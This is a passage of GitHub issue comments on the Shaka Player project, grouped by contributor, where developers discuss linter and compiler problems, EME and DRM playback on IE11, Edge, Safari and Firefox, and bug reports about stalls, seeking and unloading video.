exception of removing the @expose annotations. Reason being is that without it, the compiler is renaming both the selectVideoTrack function and the videoSource variable (which is now just a protected member), which breaks an external custom ABR manager. Is there a better way to stop the compiler from renaming?\n. Yes the only reason to expose videoSource was to call videoSource.selectVideoTrack with different parameters. No worries about the change, I've updated the PR so that videoSource remains private and SimpleAbrManager.selectVideoTrack has the exta parameter for the offset.\n. The linter is returning some additional errors compared to the latest master branch (all \"Missing space before..\" or \"Wrong indentation: expected any of..\" errors) - should there be zero errors? I wasn't sure if this was a requirement as master also has these (about 200 errors). Unless me running this on Windows via Cygwin is giving different results? Here is a gist of the the linter log for this branch: https://gist.github.com/jonoward/a49b613c9ac5c988779c\n. Yeah this is a weird one, if I clone a fresh copy of master, with no modifications, and run the linter I get a bunch of errors, nearly all of them are the [Missing space before \"(\"] error, e.g. lines like this:\nhttps://github.com/google/shaka-player/blob/master/lib/media/eme_manager.js#L115\nIs it possible that the lint rulesets are slightly different on Cygwin? Because for me it seems that nearly all the usages of Promise.catch are failing this test, when I'm not sure if they should (seems it should only apply for actual catch blocks).\nI'll try to tweak this PR branch so that it at least fails the linter in the same way that master does. I could run the automated fixjsstyle command, but I'm not sure if you actual intended for these Promise.catch calls to have the extra spaces. I'll try rustle up a linux VM to see if I get different results there. Thanks for the help..\n. Right, have pushed some new formatting changes such that the linter is reporting no errors when run on Linux - could you try run the bot again? Thanks\n. I've got latest master with no modifications and I can still repro. Here is my working tree + linter output: https://dl.dropboxusercontent.com/u/42310035/shaka-master.tar.gz\nPerhaps it's something environmental with my Cygwin setup, could I be on an older version of Closure? Or is everything contained within the working tree?\n. Yup I'm using the Cygwin version of Python, version 2.7.5-3. Which are you using?\n. I think I've figured out what has happened. It seems I had a globally installed package for closure_linter in C:\\cygwin64\\lib\\python2.7\\site-packages which was being used in place of the package within the working tree. I'm not sure what installed this package, but it appeared to be an older version than the one in the working tree. I uninstalled all python related cygwin packages, deleted C:\\cygwin64\\lib\\python2.7\\ and reinstalled everything, and now the linter is reporting zero errors as expected on latest master. So seems to be environmental. Cheers\n. Yup good point, prepending to the path would have probably resolved it...\n. Have submitted changes that should address most of the code style/annotation suggestions. \nRegarding persistent licenses - can confirm that I was wrong, IE11 and Edge do support persistent PlayReady licenses. I tested this through the the regular StreamVideoSource (not OfflineVideoSource) with our PlayReady service setting a persistent license; subsequent plays do not require the license to be retrieved from the server, it uses the license persisted on disk. \nI'm not currently able to fully test offline playback, but it should in theory work, as I think all the prerequisites are there (IndexDB and persistent licenses). For MediaKeySession.load, I'm currently rejecting the promise with a \"Not yet implemented\" error - is this acceptable for now? Once I (or someone else) has time, could we submit a new PR to support offline playback?\nApart from this, I think the last remaining issue was deciding how best to implement the shaka.util.Uint8ArrayUtils.key, which I can look at tomorrow. Thanks for the detailed review!\n. Ok no worries Joey, cheers\n. Thanks Joey, I'll aim to incorporate these changes in the next few days.\n. @joeyparrish Apologies for the delay, I'm working on this now, so I should have something within a 1-2 days\n. @joeyparrish Right, that should hopefully be all the discussed changes pushed up. I've rebased on latest master and have removed our usage of the shaka.util.Uint8ArrayUtils.key from the polyfill. \nRegarding non-zero start times, yes this still seems to be an issue. In our fork, we made some additional changes to pass playbackStartTime down to each individual stream, to avoid relying on currentTime being set. It's a little messy though, have a look at this branch if you're interested - https://github.com/blinkbox/shaka-player/tree/release/1.4.0. Quite like the idea of waiting for the buffer to contain data before setting currentTime (that you mentioned in #101), rather than waiting on loadedmetadata.\n. Awesome, thanks\n. @joeyparrish nope I didn't run into issues like this. I gave this a try here, and I get different, but mixed results:\n- WinServer2012 + IE11 - Plays from start to about 1m50s then goes into permanent buffering state (on highest bitrate). It consistently stalls at the same point.\n- Win8.1 + IE11 - Doesn't play at all for me (see JS errors in the console, need to investigate further)\n- Win10 + Edge: Plays from start to about 1m30s then crashes the tab!\nSince this is 4k (and the segments are quite large), perhaps it's exceeding some kind of internal memory limit for the buffer? As we're seeing different behaviour, maybe related to hardware differences? I'm guessing a bit though.\n. The content that comes out of Azure Media Services works with IE11 (as you'd expect!), here's an unencrypted sample that I know works - http://wams.edgesuite.net/media/MPTExpressionData02_SeekDemo/BigBuckBunny_1080p24_IYUV_2ch.ism/manifest(format=mpd-time-csf). \nI realise you probably can't just take something like this and include it as a test asset in the repo, but it may help to try see the differences between them and the encoding generated from Azure Media Services.\n. That's really weird. What version of windows are you using? Physical or virtual?\n. Whoops, yup I meant http headers. Will reword that whole comment, it's a bit clunky...\n. Actually you're right, it doesn't, I'll remove this (and any other refs in the polyfill). I can't find definitive documentation about Edge, so I'll presume it doesn't support it either, as most of the EME implementation so far seems to be pretty much identical between them\n. I might be wrong, persistent license may be supported after all, I need to do some investigation into this\n. Ah yes I see, we didn't consider that scenario. What do you think is best here, pull in an external MD5/SHA1 library (with an appropriate license), or come up with something custom? We had mentioned the possibility of using WebCrypto to do the hashing; this would work, but this is already one of the features that requires a secure origin, so until EME itself requires secure origin I guess this isn't feasible?\n. Sounds good, thanks\n. It's assigned in the install() func. This was basically copied from the patchedmediakeys_v01b implementation.\n. ",
    "kelvinoliveira": "\nAdded support for multiple DRM schemes per ContentProtection and simplified DRM scheme configuration.    #71\n\nCould not find shaka.player.DrmInfo class on version 1.5.0 as stated in https://shaka-player-demo.appspot.com/docs/shaka.player.DashVideoSource.html#ContentProtectionCallback\nMaybe, this file is not up to date\nhttps://github.com/google/shaka-player/blob/4cc4e96dbd5d2fd1b47e622eb8505d3ab4848cc0/shaka-player.uncompiled.js\nI think that, this line of code should be inserted:\ngoog.require('shaka.player.DrmInfo');\n. Thank you, It's is working now.\n. ",
    "samdutton": "Sorry \u2013\u00a0forgot to add that.\nMac OS X 10.9.5\nJava 1.6.0_65\n. Thanks Joey \u2013 I should have thought of that...\nFor anyone needing to update Java on Mac, I recommend the instructions here\nhttps://gist.github.com/johan/10590467.\nOn 5 May 2015 at 23:44, Joey Parrish notifications@github.com wrote:\n\nThe compiler is built with Java 1.7, so you will need that at a minimum.\nSorry for the inconvenience! I will update the docs on github to mention\nthis.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/74#issuecomment-99252949.\n. \n",
    "kkarablinkbox": "Hi,\nJust wanted to say that we've done exactly the same thing, asked Level3 to ignore the query string params and it has worked for us. We've tried other approaches but none really worked in an easy way. I'll let Joey respond to the reasoning, if there's any other than what you've already mentioned around bandwidth estimation.\n. ",
    "swilly22": "Resolved 202799a\n. ",
    "JobaDiniz": "Browser: Chrome Version 42.0.2311.152 m\nSorry... in the upcoming weeks I'm not available to help... \nI never said this is a bug, that's why I posed the question \"Should unload method set src to empty string?\". It seems that everybody sets src to an empty string (searching on google how to unload html5 video).\nI know how is hard trying to fix something that for you just works. I need to create a repro somehow (don't know how yet) when I have the time to do it.\n. OS: windows 8.1\nOn our environment, this always happened when we changed the current video.\nIn order to change video, we call shaka load method (which will call unload internally). We found out that is the unload method because we setup a call to unload when user closes our player and that raised MEDIA_ERR_SRC_NOT_SUPPORTED. Our service is telenor mytv. Near future there will be free content and you will be able to test what I'm saying.\n. Hi @joeyparrish, I was able to reproduce the error in http://shaka-player-demo.appspot.com/. Before calling app.player_.unload(), run the following code:\nvar video = document.getElementById('video');\nvideo.addEventListener('error', function(e){console.error(e)});\nAfter calling app.player_.unload(), you should get\nEvent {}bubbles: falsecancelBubble: falsecancelable: truecurrentTarget: nulldefaultPrevented: falseeventPhase: 0path: Array[6]returnValue: truesrcElement: video#videotarget: video#videotimeStamp: 1434057371604type: \"error\"__proto__: Event(anonymous function) @ VM645:3\n. 4\n. So how is the correct approach to listen for errors? Is there a code\nsnippet you can share?\nOn qui, 11 de jun de 2015 at 20:49 Joey Parrish notifications@github.com\nwrote:\n\n@JobaDiniz https://github.com/JobaDiniz, @donato\nhttps://github.com/donato, I finally see what's going on.\nThis error is fired on video, but after Player has stopped listening for\nevents. this.eventManager_.removeAll() runs before the source is unloaded,\nso the Player does not receive this event.\nAs far as I can tell, this event is a completely harmless side-effect of\nthe way we unload. Until we (not we=Google, but we=the internet) come up\nwith a better way of unloading a video source to reuse the video tag, my\nrecommendation is not to listen for errors on the video tag directly.\nInstead, listen for errors on Player.\nListening on the Player will filter out errors you shouldn't have to care\nabout, like this one, and it will allow you to receive lots of important\nerrors that aren't dispatched through the video tag, like DASH-related or\nnetwork-related errors.\nSo this brings us back to the original topic: is it correct to unload this\nway?\nMy feeling on the matter is that yes, it is okay to unload this way, but I\nam very open to alternatives. As mentioned in an earlier comment\nhttps://github.com/google/shaka-player/issues/80#issuecomment-104452250,\nI tried several alternatives already, to no avail:\ndelete video.src; // has no effect.\nvideo.src = null; // cast to a string, causes src to become a relative url to \"null\"\nvideo.removeAttribute('src'); // makes src attribute a blank string, but does not unload the original source\nIf anyone has any other ideas, or if anyone can find a more canonically\ncorrect approach to unloading in a w3c doc somewhere, I would be happy to\ntry it.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/80#issuecomment-111308423.\n. I think it would.\n\nThanks for the snippets.\n. You're right, sorry. I'll test with the right license server.\nMt actual problem is that seeking takes too long, sometimes 10 seconds\n(when using the right license server)\nOn qua, 17 de jun de 2015 at 21:37 Joey Parrish notifications@github.com\nwrote:\n\nWhen I play this content, without seeking, I find that the video stalls at\n9 seconds. When I've seen this behavior in the past, the problem is usually\nthat the license we received did not contain the correct key.\nUnless you specify a license server URL in the test app UI, the license\nserver used is http://widevine-proxy.appspot.com/proxy . My guess is that\nthis is not the correct license server for this content, and that we get 9\nseconds of playback because the first 10 seconds of the content are clear.\nI can't reproduce the behavior you are describing. Is there a license\nserver URL I should be using to override the default?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/107#issuecomment-112994553\n.\n. Didn't see that in docs, thanks :+1: \n. \n",
    "donato": "I am seeing this same error every time when calling unload()\nError thrown from : https://github.com/google/shaka-player/blob/master/lib/player/player.js#L231\nStream : http://samplescdn.origin.mediaservices.windows.net/e0e820ec-f6a2-4ea2-afe3-1eed4e06ab2c/AzureMediaServices_Overview.ism/manifest(format=mpd-time-csf)\nOS : Mac OSX\nChrome : Version 43.0.2357.124 (64-bit)\n. Yes. There are two versions of the error. I get this one when step debugging during _player.unload() : \njs\n{\n  MediaError\n    code: 4\n    __proto__: MediaError\n        MEDIA_ERR_ABORTED: 1\n        MEDIA_ERR_DECODE: 3\n        MEDIA_ERR_NETWORK: 2\n        MEDIA_ERR_SRC_NOT_SUPPORTED: 4\n}\nAnd this one when following the same steps without debugging\nUncaught (in promise) DOMException: The existing MediaKeys object cannot be removed while a media resource is loaded.\n. Listening to shaka player for errors is demonstrated here\njs\n      player.addEventListener('error', function(event) {\n        console.error(event);\n      });\n. No problem, I suppose this will open the door for a real change in the future!\n. ",
    "spiralman": "For Uint8Array, my original plan was to remove all the static uses of them, and make them dynamic on initialization time. However, after digging in a little more, I think it might be easier to \"poly fill\" them as no op functions. \nSince the browsers without those types won't work anyway, it's just a matter of getting past load time exceptions.\nIf I do go down that path, would it be best to add them as a new poly fill, or just statically in a module that uses them? It seems adding them as a poly fill module would break a pattern, since those are all installed by the calling code, rather than loaded implicitly as these would have to be.\n. Thanks for getting started on this. I have a few things going on this week, but I'll hope to get started on a PR tomorrow. I'll be sure to check the contributing document, and sign the contribution agreement.\n. @joeyparrish Thanks for the feedback. WRT CONTRIBUTORS/AUTHORS, since I'm doing this for uStudio I need to wait for somebody else to agree to the Corporate CLA, so I left it out of the PR for now.\nI actually intended to open this against our fork, so one of our other devs could review it, so you didn't have to deal with the fiddly stuff, but I guess GitHub doesn't allow that.\n. @joeyparrish Your comments should be addressed, other than the contributor stuff. I'll update those files and ping you again when we get that sorted out on our end.\nThanks again!\n. @joeyparrish We finally got the CLA taken care of, so I've pushed the new AUTHORS and CONTRIBUTORS file, so it should be GTG.\n. @joeyparrish Sorry about all the back and forth, but hopefully I have it all fixed now.\n. Ok, @joeyparrish I think I have it.\n. @joeyparrish No problem; back to you.\n\n. No problem; thanks for sticking with all the back and forth!\n. Sure thing.\n. It does, but it fires when the document enters the 'interactive' state, at which point document.body is still null.\nI think this isn't ideal on a real page, since it waits for images, etc, to load, but since it's just the support page (and has no external resources) it seems best to keep it simple.\n. You're right. For some reason, I thought IE had tripped up when I didn't quote it, but I can't reproduce that behavior, so there must have been something else wrong.\n. There is one here; I added it inside the if, but I can try to fit it on the end of the line, if that's more in-line with your style.\n. Same here; should I move it up?\n. ",
    "sam2007": "Hi Joey,\nWhen the player gets to the point where there is a discontinuity it just stalls. With the following log.\nUsing native EME as-is.\n+ video/mp4; codecs=\"avc1.4d401e\" is supported\n+ audio/mp4; codecs=\"mp4a.40.2\" is supported\n+ video/mp4; codecs=\"avc1.4d401e\" is supported\n+ audio/mp4; codecs=\"mp4a.40.2\" is supported\nInitial seek range [0, 3179.84]\nStarting each stream from 0\nStarting stream for s\u2026a.m\u2026a.StreamInfo {uniqueId: 1, id: \"p0a1r0\", timestampOffset: 0, currentSegmentStartTime: null, bandwidth: 93000\u2026}\nStarting stream for s\u2026a.m\u2026a.StreamInfo {uniqueId: 0, id: \"p0a0r0\", timestampOffset: 0, currentSegmentStartTime: null, bandwidth: 1500000\u2026}\nmin/max timestamp corrections [0, 0]\nCorrected seek range [0, 3179.84]\nCustomEvent {detail: Error: The browser failed to decode the media content.\n    at shaka.player.Player.onError_ (http://l\u2026, srcElement: null, target: s\u2026a.p\u2026r.Player, currentTarget: s\u2026a.p\u2026r.Player}bubbles: truecancelBubble: falsecancelable: falsecurrentTarget: shaka.player.PlayerdefaultPrevented: falsedetail: Error: The browser failed to decode the media content.\n    at shaka.player.Player.onError_ (http://localhost/shaka-player1.3.1/lib/player/player.js:371:15)eventPhase: 0path: Array[0]returnValue: truesrcElement: nulltarget: shaka.player.PlayertimeStamp: 1433492986848type: \"error\"__proto__: CustomEvent\nOn the event listener of the player I put player.seek(1300) for example:\nplayer.addEventListener('error', function(event) {\n        console.error(event);\n        player.seek(1300);\n      });\nThe bar shows that it did seek but the player is still stalled.\n. We tried the same stream with exoplayer, it stalls for a fraction of a second but then it kept on.\n. Hi Joey,\nYes, I can confirm that while the player stops playing the video, when it reached the point of discontinuity, shaka.media.Stream.prototype.onUpdate_  keeps on firing.\nWe managed to make the player seek on error event by reloading the source stream by doing the following as an example:\n```\n// Listen for errors from the Player.\n      player.addEventListener('error', function(event) {\n        var videoerror = document.getElementById('video');\n        console.error(event);\n        console.error(\"xxx\");\n        console.error(player.error_time); \n        console.error(parseInt(player.error_time)+1); \n    var mpdUrl = 'http://xxx.xxx.xxx.xxx:1935/vod/stream.mp4/manifest.mpd';\n  var estimator = new shaka.util.EWMABandwidthEstimator();\n  var source = new shaka.player.DashVideoSource(mpdUrl,interpretContentProtection,estimator);\n\n  player.load(source).then(function() {\n  videoerror.pause();\n  player.seek(parseInt(player.error_time)+1);\n  videoerror.play();\n  });\n\n```\nIt worked but it is obvious to the viewer that the player restarted the source (screen goes white for a fraction of a second then continue playing).\nIs there a better solution to handle this kind of problem? Like maybe a way that we can retain the last frame before the error while reloading the source?\nBest regards,\n. Sorry I didnt see that it was already added to the milestone\n. ",
    "allenevans": "Our use cases are within the VOD context and our goal is to reduce re-buffering. Typically we use a large buffer size of 120 seconds.\nBelow are the situations why being able to set the initial buffer size would be useful:\n1. Through experimentation in live, we have found that tweaking this value has helped to reduce re-buffering during start up for VOD.\n2. Having some way to customise this value will allow us to easily A/B test values.\n3. We cannot edit the manifest values as they are shared with players across multiple platforms.\n4. In the future we would like to set this buffer size based upon estimated line speed or previous playback history to reduce start-up latency without causing re-buffering events.\nI've already put together a potential pull request https://goo.gl/nYhbm0 with the proposed changes.\n. Not to worry, we're going to wait until this lands in 1.4.0 and review what changes, if any, we need to make.\nThanks.\n. For now, we can wait until #51 has been resolved to see if this change is required.\nI've put together a commit on our fork https://goo.gl/m19pyh that we intend to use for Shaka 1.3.1 and review this when 1.4.0 is released.\n. ",
    "sarge": "Thanks! I just spotted that myself.\n. @joeyparrish I have added buffer length to the visualisation. Shall I include it in this PR or open another?\n. @joeyparrish I have updated the PR with your suggestions.\n. Sure here are my settings, as I read them they should be high enough based on your tests.\nLet me know if you want me to run any other tests\njava -XX:+PrintFlagsFinal -version | grep HeapSize\n    uintx ErgoHeapSizeLimit                         = 0               {product}\n    uintx HeapSizePerGCThread                       = 87241520        {product}\n    uintx InitialHeapSize                          := 11533440        {product}\n    uintx LargePageHeapSizeThreshold                = 134217728       {product}\n    uintx MaxHeapSize                              := 184549376       {product}\njava version \"1.7.0_21\"\nJava(TM) SE Runtime Environment (build 1.7.0_21-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 23.21-b01, mixed mode)\n. Have just run 6 builds in a row. Happy for you to close\n. Sure that will work.\nCaptions are targeted at the hearing impaired. For example if you are hearing impaired, and an English speaker the captions will contain English dialogue but also environmental noises that might influence the actors. [bang!] to indicate a loud noise, [creaking floorboards] to add suspense, etc...\nSubtitles are dialog translated to a different language, potentially you could have captions in different languages.\nThe rendering of each is identical, captions may use the location features of WebVTT to indicate a noise came from the left or right of the screen.\nNot everyone will be interested in the distinction. But if you have ever watched a movie with closed captions when you wanted subtitles it can be very distracting. An example I watched recently was Deadlands in which the dialog is in Maori, which I don't speak but it included captions which wasn't ideal.\n. Thanks Joey!\nOn 22 Mar 2016 06:03, \"Joey Parrish\" notifications@github.com wrote:\n\n@sarge https://github.com/sarge, Shaka v2 should now distinguish\nbetween caption and subtitle tracks. Thanks for the report!\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/206#issuecomment-199381787\n. Yes I spotted this too.\n\nhttps://shaka-player-demo.appspot.com/\nAttempting to playback with content \"Oops\" (modified YT DASH EME test) - MP4, multi-DRM\"\nChecking the release notes Edge has removed support for VP9, but I have checked the content which uses avc1.4D4015 which is supported. So I don't think it is a codec issue.\n. So I have been digging in a bit more.\nI think it is the call to setMediaKeys https://github.com/google/shaka-player/blob/87ac05e/lib/media/eme_manager.js#L452\nThe promise does not resolve.\nAppears to be a native call on Edge, I am unsure if it should be polyfilled or not.\n. So I get the message 'Using native EME as-is', also 'Using native Promises'.\n@joeyparrish I am about for the next 2 hours if it suits you to take a crack at this.\n. Sure ok, any suggested next steps? How can I verify if the promise is not resolving. \nThe media keys object appears valid, it has the correct type and has the createSession, setServerCertificate methods on it.\n. OK so it the mediaKeys are null\nI thought should get another option\nhttps://dev.windows.com/en-us/microsoft-edge/testdrive/demos/eme/\nRunning content on this page does not work, sintel trailer\nSeems like a different error - MEDIA_ERROR_SRC_NOT_SUPPORTED\nBut looking at the media keys on the video element, they do appear they have been set. I noticed that they are not using a promise on the setMediaKeys function.\nCould you check if this page does work for you, I don't have access to an older version. Then at least I can open that as a bug as well as referencing the shakaplayer.\nAlso I noticed that the dashif.org reference player is working, any issues if I look at that source to contribute to shaka?\n. So Edge 20 is using a polyfill EME v20140218\nI have force Edge to load that polyfill (on 1.6.2) which does get it further, eme seems to initialize \n'All Streams have completed startup!'\n'Timestamp correction 0'\nPlayer Error - 'The browser does not support the media content'\napp.video_.mediaKeys -> now has a mediakey with the key system set to \"com.microsoft.playready\"\nPerhaps there is something in the polyfill I should remove?\n. So Doolali is correct the console does that output.\nDebugging shows that this is a Promise object, has methods of catch, then. So it would appear Edge does not resolve this promise.\nReordering the MediaKeys.install forcing the IE11 fixes works for me, testing on Chrome 49, Edge 25\n```\nif (window.MSMediaKeys) {\n  shaka.log.info('Using EME v20140218');\n  shaka.polyfill.PatchedMediaKeys.v20140218.install();\n} else\n...\n```\n. Actually one more thing, adding the catch to the promise shows that the promise is resolving but with an error.\nThis is the source of the InvalidStateError.\nSeems to be some difference between the MediaKeys and MSMediaKeys on Edge. \n@joeyparrish is this a bug or simply by design at this stage? Have MS committed to removing their vendor prefixes?\n. Your understanding is correct, the error is bubbled up.\nThe fun was figuring out what the source of the error is, which I am now certain that it is the setMediaKeys call.\n. @joeyparrish Comparing master and the release version 1.6.3,  it looks like this fixes the live streaming on Edge, when testing using \"GPAC/SegmentList\" sample.\nBut the issue with the on demand profiles remains. I tested with \"Oops\"\nIt appears that it is still using the native EME.\nThe error still appears on the setMediaKeys. It looks like setMediaKeys is called before  videoSource.attach() at https://github.com/google/shaka-player/blob/master/lib/player/player.js#L336 if that is still your theory for why this fails. \n. Thanks Alex.\nOk so it is reasonable that requestMediaKeySystemAccess should tell us if the key system is supported. We don't need to attempt to play some content, to trigger the CDM to download at which point requestMediaKeySystemAccess will advertise that the CDM is available.\n. @joeyparrish thanks for the clarification:)\n. @joeyparrish would it help if I provide some test content to run against?. @joeyparrish I have uploaded a working sample of the fairplay drm. \nhttps://s3.amazonaws.com/shift72-temp/hls_fps_bento4_sintel/master.m3u8\nThis file contains reference to the \"Apple Developer Program License Agreement\", so you can choose not to view it. Not sure what to do about worlds colliding here (shrug)\nhttps://s3.amazonaws.com/shift72-temp/hls_fps_bento4_sintel/safari_hls.html\n@boredom2 HLS + Fairplay works on Safari Desktop. But does not work on Safari iOS, an app is still required.\nDash + Fairplay + (Widevine + Playready) + MSE appears possible, implementations are rare from what I have seen. An additional pssh box with the fairplay id and some work generating the initData in the format  [initData] = [initData] + [4 byte: idLength] + [idLength byte: id] + [4 byte:certLength] + [certLength byte: cert] should work. \n. Thanks Joey for taking a look at this. You got further than I did. Would you mind pushing a branch?\nfps.2_0 being for MSE is a good find - the apple forums note that NetFlix uses this scheme.\nWhen you say after the certificate request you get a message that is empty do you mean that get a call to webkitkeymessage with no initdata?\n. I have had a dig into how other well know players appear to work. These are the functions and events I have seen. I am a little unclear on the role of webkitkeymessage at this stage.\n```\n[Info] EME LOGGER: WebKitMediaKeys.isTypeSupported (2) (inject.js, line 54)\n\"com.apple.fps.3_0\"\n\"video/mp4\"\n// get the init data from the content\n[Log] video.webkitneedkey called \u2013 Uint8Array (253) (inject.js, line 85)\nUint8Array (253)\n// create the session with the initdata \n[Info] EME LOGGER: WebKitMediaKeys.create session (2) (inject.js, line 69)\n\"video/mp4\"\nUint8Array (251)\n// \n[Log] session.webkitkeymessage called \u2013 Uint8Array (11) (inject.js, line 73)\nUint8Array (11) \n// certificate being added\n[Info] EME LOGGER: session.update called \u2013 Uint8Array (1246) (inject.js, line 61)\nUint8Array (1246)\n[Info] EME LOGGER: session.update \u2013 \"MIIE2jCCA8KgAwIBAgIIBRGnbPd8z1YwDQYJKoZIhvcNAQEFBQAwfzELMAkGA1UEBhMCVVMxEzARBgNVBAoMCkFwcGxlIEluYy4xJjAkBgNVBAsMHUFwcGxlIENlcnRpZmljYXRpb24g\u2026\" (inject.js, line 62)\n// license being added?\n[Log] session.webkitkeymessage called \u2013 Uint8Array (6576) (inject.js, line 73)\nUint8Array (6576)\n[Info] EME LOGGER: sessionupdate \u2013 Uint8Array (1052) (inject.js, line 61)\nUint8Array (1052)\n[Info] EME LOGGER: session.update \u2013 \"AAAAAQAAAAAeuevhIffYAy83tkB6vtdqAAAEAPX5+hQW6VnoZjC6GVznn3zbfn86yM1UM22rXjEfriDHzw9lDiGPzGLYGFtMB6nT1kAwYeSvNZJ9CHxIqTZWf4VTt3Q1AGTZkgieM7Rs\u2026\" (inject.js, line 62)\n// playback succeeds\n```\n. So I reached out to Apple for support on this issue and the feedback is that this is not currently part of their public api, so would not offer any support in this matter. I filed a feature request as suggested.\nIt could be any number of issues at this point, I would not rule out a whitelist on the certificate or signing authority restricting this feature.. @joeyparrish Unfortunately all done comms were over email, also the feature request does not have an external link either. I will update this thread if I hear back.\nI agree that this issue can be closed until we hear more.\nThanks for your efforts:)\n. Thanks for the update Joey. I'm impressed by the rigour of you and your team:). Done:)\n. The linter had plenty to say but not about that. I have updated the private variables and functions to be more inline with the rest of the project.\n. Removed the constants, and switched type to indicate a possible null.\n. Yes, thanks. Slowly developing my sense for Closure\n. Cheers, switched implementation to clearRect.\n. The intention was to add some padding to the bottom, for a time series, but I haven't taken advantage of that yet.\n. Is /** @private {Array.<Object>} */ valid as the objects are created and consumed internally.\nI am storing an js object with the structure of {timestamp: t, value: [int]}.\nOf should this be declared as its own type?\nI assume you wrote something like this but it was lost in the markdown conversion\n. ",
    "cpeterso": "@nickdesaulniers and I work at Mozilla. I've forwarded this bug to our MSE developer. He has been refactoring our MSE implementation in 41\u201342, so regressions are not unexpected. :-)\nWe plan to enable MSE by default in FF42 (in the Firefox Nightly channel now).\n. Firefox Nightly 45 now loads the mpd from the first comment, but it does not play automatically (like it does in Chrome).\nPlayer error error { target: null, isTrusted: false, detail: TypeError, eventPhase: 0, bubbles: true, cancelable: false, defaultPrevented: false, timeStamp: 1446585931411407, NONE: 0, CAPTURING_PHASE: 1, AT_TARGET: 2 } app.js:962:3\napp.onPlayerError_() app.js:962\nshaka.util.FakeEventTarget.prototype.recursiveDispatch_() fake_event_target.js:143\nshaka.util.FakeEventTarget.prototype.dispatchEvent() fake_event_target.js:121\nshaka.player.Player.prototype.load/<() player.js:352\n(Async: promise callback) shaka.player.Player.prototype.load() player.js:321\napp.load_() app.js:758\napp.loadDashStream()\nIf I press the play button, the video will start, but hiccups after a couple seconds and logs the following console error:\nSBM video/mp4: multiple buffered ranges detected: Either the content has gaps in it, the content's segments are not aligned across bitrates, or the browser has evicted the middle of the buffer.\nsource_buffer_manager.js:455:1\nshaka.media.SourceBufferManager.prototype.detectMultipleBufferedRanges() source_buffer_manager.js:455\nshaka.media.Stream.prototype.onUpdate_() stream.js:515\n@jyavenard: is this a problem with Firefox's MSE, the Shaka player, or the encoded media?\n. I reported this autoplay and \"multiple buffered ranges detected\" issues in Firefox bug 1221329.\n. @mattcoz: which version of Firefox are you testing and on which OS? I can seek in the I_ENT472 mpd with both Firefox 42 and Nightly 45 on OS X. I do see a lot of buffering delays (and Shaka's \"Pac-Man\" spinner), but I think that is a problem with the video encoding because I see that with Chrome, too.\n. I can now reproduce with Firefox 45 on Windows 8. I think this is a Firefox bug, not a Shaka Player bug, because I can reproduce the seek problem when playing this mpd in other DASH players, such as Bitdash and DASH-IF.\n@joeyparrish: I think you can close this bug report as \"not a Shaka bug\". I filed Firefox bug 1229592 to track this issue (and CC'd @mattcoz).\n. I filed Firefox bug 1265512 to track the \"Angel One\" stall. This seems like a recent issue in Firefox and/or Shaka because I know I've tested all these videos in Firefox before. The \"Sintel (multicodec)\" video also stalls, 100% reproducible in Firefox 45\u201348 on OS X.\n. btw, the \"Angel One\" and \"Sintel 4k\" stalls are Firefox bug 1261900, reported by modmaker.\n. Shaka assumes Widevine support implies WebM support. Firefox (Nightly) just landed supported Widevine, but only in MP4 for now.\n. @robwalch Widevine is now available in Firefox 47, which was released this week. The \"Tears of Steel (Widevine)\" video works for me with Firefox 47, 48 (Beta), and 50 (Nightly) on OS X. Can you please try retesting?\nI suspect you may have hit a temporary problem during Firefox Nightly 49 that has been reverted. We tried to update to a newer version of the Widevine CDM about two weeks ago, but hit some content compatibility problems. Firefox bug 1273214 has more information.\n. btw, the persistentState problem @kidmiracleman reported above is Firefox bug 1278198. I think @robwalch saw a different problem.\n. @yairans, can you please elaborate on what you mean by \"Shaka crashes\"? Does the stream stop loading? Do you see a JavaScript exception in Firefox's web console?\nYour Disney stream plays correctly for me using the Shaka demo player on Firefox 48 and Firefox Nightly 51 (on Windows 10).\n. Good news! I was able to reproduce this exception. (I forgot to switch audio tracks when testing.)\nThis problem was Firefox bug 1247138 (\"Handle MSE audio configuration change\"). It is fixed in Firefox Beta 49, which will be the new stable release on September 20 next week.\n@joeyparrish, please feel free to close this GitHub issue (now or when Firefox 49 is released next week), unless you plan to work around this problem in Shaka for people using outdated Firefox versions.\n. Mozilla hit this same Wowza HTTP/HTTPS manifest problem (with HLS.js: issue #281). We had to hook into HLS.js' network code and rewrite the Wowza manifest's HTTP URLs to HTTPS on the client-side during playback.\n. @boredom2: on which operating systems do you see this Firefox seeking problem? Do you see this problem with all streams?\n. Using the steps provided by @danpeters76, I can reproduce the buffering problem with Firefox on Windows 10 and Mac OS X 10.12, though I don't see any console errors. The stream resumes within 1-2 seconds in Chrome and Edge, but buffers for about 1-2 minutes in Firefox before resuming.\nI reproduce the problem any of the Shaka demo streams, not just the United Streaming streams. I don't think this is a Firefox regression because I can reproduce the stall with older versions of Firefox (45-49).\nAre older versions of the Shaka demo player archived online? That would make regression testing easier. I only tested the current Shaka v2.0.1-debug demo player:\nhttp://shaka-player-demo.appspot.com/demo/\n. I filed Firefox bug 1313806 to investigate this problem from the Mozilla side. The Shaka 2.0.1 code works in Chrome, IE11, and Edge, so Firefox should try to be compatible.\nSafari (macOS 10.12.1) has a different seeking problem with current Shaka demo: the audio begins playing at the new seek position, but the video doesn't start playing unless you manually pause and resume playback.\n. @cheersalam: did you see these network errors before Firefox 50? Do you have any Firefox extensions installed that might interfere with HTTP requests? Can you reproduce this problem in Firefox Safe Mode? (Open about:support and click the \"Restart with Add-ons Disabled\" button.). @cheersalam: did you see these network errors before Firefox 50? Do you have any Firefox extensions installed that might interfere with HTTP requests? Can you reproduce this problem in Firefox Safe Mode? (Open about:support and click the \"Restart with Add-ons Disabled\" button.). @jyavenard: @TheModMaker says above that Firefox is caching requests to the time sync server, causing playback clock problems. Is this something Firefox's MSE code is doing?. @jyavenard: @TheModMaker says above that Firefox is caching requests to the time sync server, causing playback clock problems. Is this something Firefox's MSE code is doing?. I can reproduce this stuck video with Firefox 50 and Firefox Nightly 53 on Windows 10 and macOS 10.12. The same video test plays correctly (after clicking the \"play/pause\" button) in Edge and Chrome on Windows 10 and macOS 10.12.. @ckelsey, I am unable to play either of your .mpd manifests in the Shaka or DASH-IF demo players in Firefox, Chrome, or Edge on Windows 10. Shaka reports \"Shaka Error 